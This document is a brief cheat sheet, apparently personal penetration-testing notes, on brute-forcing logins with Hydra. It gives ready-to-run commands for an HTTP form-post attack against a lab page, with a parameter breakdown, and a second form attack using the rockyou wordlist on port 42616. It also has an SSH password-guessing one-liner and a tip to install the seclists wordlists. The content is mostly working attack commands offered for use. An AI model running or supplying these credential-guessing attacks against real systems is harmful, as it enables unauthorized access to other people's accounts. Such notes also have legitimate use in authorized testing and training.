# Hydra

---



Hydra Password Bruteforce

```bash
hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```

**Good to clone github "seclists" for this**

```bash
apt -y install seclists
```



 Explanation:

```
Host = 192.168.1.69
Method = http-form-post
URL = /w3af/bruteforce/form_login/dataReceptor.php
Form parameters = user=^USER^&pass=^PASS^
Failure response = Bad login
Users file = users.txt
Password file = pass.txt
Threads = -t 10
Wait for timeout = -w 30
Output file = -o hydra-http-post-attack.txt
```

Other example

```bash
hydra 111.11.111.11 http-form-post "/:password=^PASS^:Invalid" -P /usr/share/wordlists/rockyou.txt -l user -t 10 -s 42616 -v
```

This attacks the ip address on port 42616



## SSH

~~~bash
hydra -l username -p password ssh 1.1.1.1:1234
~~~

